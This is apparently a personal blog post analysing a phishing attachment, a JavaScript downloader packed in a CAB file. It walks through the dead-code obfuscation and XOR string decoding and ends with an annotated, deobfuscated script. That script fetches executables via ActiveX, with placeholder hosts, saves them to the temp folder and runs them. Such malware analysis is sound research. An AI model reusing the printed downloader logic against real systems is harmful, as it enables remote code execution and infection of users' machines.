---
title: Eating My Spam 2 - So much dead code
date: 2016-05-11
tags:
    - malware
    - infosec
layout: layouts/old-post.njk
---

So, here we are again. The other day I had some time for myself. And while I'm not short of things to do and fix in my own life, I decided it would be fun to spend some more hours having a look at my Spam folder. Nice!

This time I saw one that looked interesting, suggestively titled ***URGENT: Your Attention Needed***. How could I ignore such urgency! The content went like this:

> *Our systems have detected that you card has been used from IP:230.893.68.73.
Please refer to the report attached for more details.*

Whoa, this seems serious. My card had been used from an IP so funky it had to get it's own IP standard with extra bytes to be represented. I've seen my share of **CSI** so I was pretty sure this was totes legit. I went ahead and downloaded the attached report, as asked.

```
$ file the-attached.cab
fishy.cab: Microsoft Cabinet archive data, 9812 bytes, 1 file
```

That was unusual. I don't know if Windows has some sort of support for opening CABs without extra software or it even does some sort of autorun with them, but I hope some of that is true, because otherwise what a shitty malware this is if the user has to download some funky medieval file extractor to get infected. Use zip! people know that stuff. Anyway, after `cabextract`ing it I got a single javascript file. A one-line 24,000+ character mess of a single javascript file. Not cool.

I plonked it in an editor and got it to autoformat. Now it was 1567 lines. Way better! After an initial inspection I noticed there were seven functions. They all seemed very complex, with lots of random logic thrown in. It looked really hard to debug. Here is one of them for example.

```
function mHE(pKF, qC) {
    if ("-41653".length === 6730) {
        Xi = 0xffff09b9;
    } else {
        var Esb = true;
    }
    if ("\x30\x33\x66\x61\x32".lastIndexOf("pub") == 0) {
        var SAq = "\x64\x36\x31\x37\x32\x64\x32\x64";
    } else {
        var nHw = 48577;
    }
    var vIj = -1;
    if (Math.sin(vIj) > 0) {
        var rCF = 34182;
    }
    var lnf = sI(pKF);
    var fC = -1;
    if (Math.sin(fC) == 0) {
        var FcL = '\x39\x61\x62\x39';
    }
    var SN = -1;
    if (Math.asin(SN) != 0) {
        ch = 0xffff7ea0;
    } else {
        var EYg = true;
    }
    var L0 = "4ceefb";
    var bLL = "b4af";
    if (L0 != bLL) {
        xMU = parseInt(13726);
    } else {
        var hpd = "\x64\x66\x66\x65\x39\x33\x66\x39";
    }
    var lq = -1;
    if (Math.sin(lq) > 0) {
        xa4 = true;
    }
    var Ue = "affront";
    var fm = "-42250";
    if (Ue == fm) {
        var Nb_ = parseInt(156447, 8);
    }
    var or = VsD(lnf, qC);
    if ("\x38\x33\x64\x35\x61\x61\x63".indexOf("\x65\x31\x64\x63\x34\x62\x66\x31") != -1) {
        Tb = '61529';
    } else {
        var HI = 0x2dfb;
    }
    if ("cartoon".lastIndexOf("\x31\x31\x34\x35\x61\x33\x30\x66") == -1) {
        v6 = '\x62\x39\x33\x66';
    } else {
        lZV = "d0a1";
    }
    var rhj = 1;
    if (Math.acos(rhj) >= 0) {
        Nuj = '\x34\x66\x35\x63\x33\x63';
    } else {
        GNu = false;
    }
    var nvb = 1;
    if (Math.acos(nvb) == 0) {
        XJc = true;
    } else {
        IV = '';
    }
    return (or);
}
```

However, look closely again: the return value, `(or)`, is defined a few lines before as `VsD(lnf, qC)`. `VsD` is one of the other functions defined in the file, and `qC` is passed from as an argument. What about `lnf`? That is defined as `sI(pKF)` a few lines above, and the argument `pKF` is also passed in as an argument. So... what is all the other obfuscation code doing? Well.. funnily enough, nothing! The obfuscation software doesn't really do any of the typical string concatenation, math operations or array accesses we are used to. It just plonks dead code all over the place!

This would not fool any static analysis tool, and it's hard to believe this is designed to annoy people like me that analise this things manually, so I have to assume this is a AV evasion technique, specially knowing that nowadays browsers like Chrome seem pretty good at fingerprinting and flagging malicious code.

So, back to the function, what happens when we remove all that nonsense?

```
function mHE(pKF, qC) {
    var lnf = sI(pKF);
    var or = VsD(lnf, qC);
    return (or);
}
```

A lot simpler, but still far from being clear what this done. Luckily I spent some time and here you have the six smaller functions already cleaned up and with nice names:

```
function bitwise_xor_strings(plain, key) {
    var j = 0;
    var M = "";
    for (var i = 0; i < plain.length; i++) {
        M += String.fromCharCode(plain.charCodeAt(i) ^ key.charCodeAt(j));
        j = j + 1;
        if (j >= key.length) {
            j = 0;
        }
    }
    return (M);
}
function build_activex_object(arg) {
    var e = new ActiveXObject(arg);
    return (e);
}
function hex_charcode_string_to_string(string) {
    var out = "";
    for (var i = 0; i < string.length; i += 2) {
        out += String.fromCharCode(parseInt(string.substr(i, 2), 16));
    }
    return out;
}
function xor_hex_charcode_string(hex_charcode_string, key) {
    var lnf = hex_charcode_string_to_string(hex_charcode_string);
    var or = bitwise_xor_strings(lnf, key);
    return (or);
}
function get_random_number() {
    var EA = Math.floor(Math.random() * 65536);
    return (EA);
}
function build_function(arg, code_string) {
    var y = new Function(arg, code_string);
    return (y);
}
```

They are all pretty self-explanatory. A few functions take care of XORing strings, a very common way of obfuscating data and code. We also get an `eval()` equivalent in the form of a `new Function()` constructor, an `ActiveXObject` builder and a RNG.

Left was only one function. But what a function! With 1153 LOC it was a bit too much to clean up manually, so I cheated a bit and plonked it into the [Google Closure Compiler](https://closure-compiler.appspot.com/) which cleaned it down to a more manageable 157 lines. After some more manual cleanup, we have this code as a result:

```
var a = xor_hex_charcode_string("__REDACTED_VERY_LONG_STRING__", "MEv6eJH");
a = a.split(",");
var b = [];
for (var f = 0; f < a.length; f++) {
    var d = a[f].split("|");
    var e = d[0], g = d[1];
    var h = parseInt(d[2]);
    var l = d[3];
    if (1 == b[g]) {
    } else {
        var m = xor_hex_charcode_string("20345b2a101e1048242f5d3415", "WG8Xyndf");
        var n = build_activex_object(m), p = xor_hex_charcode_string("2b2e3310023d31232657142034283200013d3d202e1b182c3b39", "XMAyrI");
        var q = build_activex_object(p);
        var r = xor_hex_charcode_string("3e414d2a225a5d2b5f592f3a1c03", "S25GNhs");
        var t = build_activex_object(r), u = xor_hex_charcode_string("22262f02", "MVJleS");
        var v = xor_hex_charcode_string("7f2921", "8luteWSv");
        t[u](v, e, !1);
        var w = xor_hex_charcode_string("43113b22", "0tUFSD");
        t[w]();
        var x = xor_hex_charcode_string("433a00391f4a", "0NaMj9Q");
        if (200 == t[x]) {
            var y = xor_hex_charcode_string("310b2700551c1b27220a2909", "PoHd72hS");
            var z = build_activex_object(y);
            z[u]();
            var A = xor_hex_charcode_string("132f3d15", "gVMp180");
            z[A] = 1;
            var B = xor_hex_charcode_string("2b2424395923340d3b2e3330", "YAWI6MGh");
            var C = xor_hex_charcode_string("19314523193b3c0e20532b02", "kT6SvUO");
            var D = t[B];
            var E = t[C].substr(0, 2);
            if (E == xor_hex_charcode_string("3a3f", "weQaUxy")) {
                var F = xor_hex_charcode_string("3a44180d52", "M6qy7SQ");
                z[F](D);
                var G = xor_hex_charcode_string("503c3647412054302358572a5b3d2746", "7YB41E");
                var H = q[G](2);
                var I = get_random_number();
                if (0 == h) {
                    var J = xor_hex_charcode_string("0f0508", "kidGbO");
                } else {
                    J = xor_hex_charcode_string("3f1f20", "ZgEAah");
                }
                var K = H + "\\" + I + "." + J;
                var L = xor_hex_charcode_string("06524008321f143c1956", "u36mFprU");
                z[L](K);
                var M = xor_hex_charcode_string("0a14284008", "ixG3myt");
                z[M]();
                var N = xor_hex_charcode_string("1f1626", "mcHtqr"), O = xor_hex_charcode_string("101c5a003f04515b", "bi4dSh");
                switch (h) {
                    case 0:
                        n[N](O + " " + K + " " + l, 1, 0);
                        break;
                    case 1:
                        n[N](K, 1, 0);
                }
                b[g] = 1;
            }
        }
    }
}
```

We can start to guess what sort of code this is, but it is also clear that most of the meat is hidden under those **XOR**d strings. I went ahead and wrote a quick script to translate this, in javascript so I could just use the original `xor_hex_charcode_string` function taken from the malware code (yay lazyness!):
```
content = require('fs').readFileSync(require('process').argv[2], {encoding: "utf-8"});
replaced = content.replace(
        /xor_hex_charcode_string\("([^"]*)",\s*"([^"]*)"\)/gi,
        function (_, string, key) {
            return '"' + xor_hex_charcode_string(string, key) + '"';
        }
);
console.log(replaced);
```

This pretty much revealed the real functionality of the malware. After concatenating a few strings here and there, we got a pretty simple script, which I have annotated here for your viewing pleasure:

```
// First of all, a list of urls, with an identifying number and some flags
var URLs = "http://example.com/executable.exe|0|1|0,http://example.com/executable.exe|1|1|0,http://example.com/executable.exe|2|1|0";
URLs = URLs.split(",");
var array_of_checked_urls = [];
for (var f = 0; f < URLs.length; f++) {
    // For each URL the system extracts the needed information
    var url_parts = URLs[f].split("|");
    var url = url_parts[0];
    var identifier_number = url_parts[1];
    var file_extension_flag = parseInt(url_parts[2]); // If this is 0, the downloaded file is a .dll, otherwise an .exe
    var argument_to_rundll32 = url_parts[3]; // If the previous number is a 0, then the payload is run with rundll32, and this is passed as an arg
    if (1 == array_of_checked_urls[identifier_number]) {
        // Do nothing if in the url was run already
    } else {
        // Build a shell, as file system and an AJAX ActiveX objects.
        var WScriptShell = build_activex_object("wscript.shell");
        var ScriptingFileSystemObject = build_activex_object("scripting.filesystemobject");
        var MSXML2XMLHTTPActiveXObject = build_activex_object("msxml2.xmlhttp");

        // Do a GET to the url
        MSXML2XMLHTTPActiveXObject.open("GET", url, 0);
        MSXML2XMLHTTPActiveXObject.send();

        if (200 == MSXML2XMLHTTPActiveXObject.status) {
            // An ADODB Stream object is created, type binary
            var ADODBStreamActiveXObject = build_activex_object("adodb.stream");
            ADODBStreamActiveXObject.open();
            ADODBStreamActiveXObject.type = 1;
            
            var responseBody = MSXML2XMLHTTPActiveXObject.responsebody;
            
            // They actually check that the first two bytes of the downloaded content are MZ, the magic
            // number for Windows executables. Otherwise it won't do anything.
            var responseTextFirst2Char = MSXML2XMLHTTPActiveXObject.responsetext.substr(0, 2);
            if (responseTextFirst2Char == "MZ") {
                // The response from the XMLHTTP request is put into the ADODB stream
                ADODBStreamActiveXObject.write(responseBody);

                // The script creates a file with a random name on the temp folder (constant value 2)
                var specialFolder = ScriptingFileSystemObject.getspecialfolder(2);
                var randomNumber = get_random_number();
                if (0 == file_extension_flag) {
                    var extension = "dll";
                } else {
                    extension = "exe";
                }
                var path = specialFolder + "\\" + randomNumber + "." + extension;

                // They dump the contents of the ADODB stream there
                ADODBStreamActiveXObject.savetofile(path);
                ADODBStreamActiveXObject.close();

                // And finally the downloaded code is run locally with the wscript.shell ActiveX object.
                switch (file_extension_flag) {
                    case 0:
                        WScriptShell.run("rundll32" + " " + path + " " + argument_to_rundll32, 1, 0);
                        break;
                    case 1:
                        WScriptShell.run(path, 1, 0);
                }
                array_of_checked_urls[identifier_number] = 1;
            }
        }
    }
}
```

So yeah! There you have it, again the same old ActiveX code-execution-without-even-exploiting-anything deal. I find it really insane that this sort of attack works at all, given it is a javascript file, inside a cab file, that requires you to have a Windows machine with a browser or mail client exposing ActiveX wide open.

Any guesses on why they keep trying this over and over? Maybe it's targeted towards markets like the chinese, where Windows XP is still widely used?

Anyway, as always, I hope you found this fun and thanks for keeping with me until the end here. Have fun!
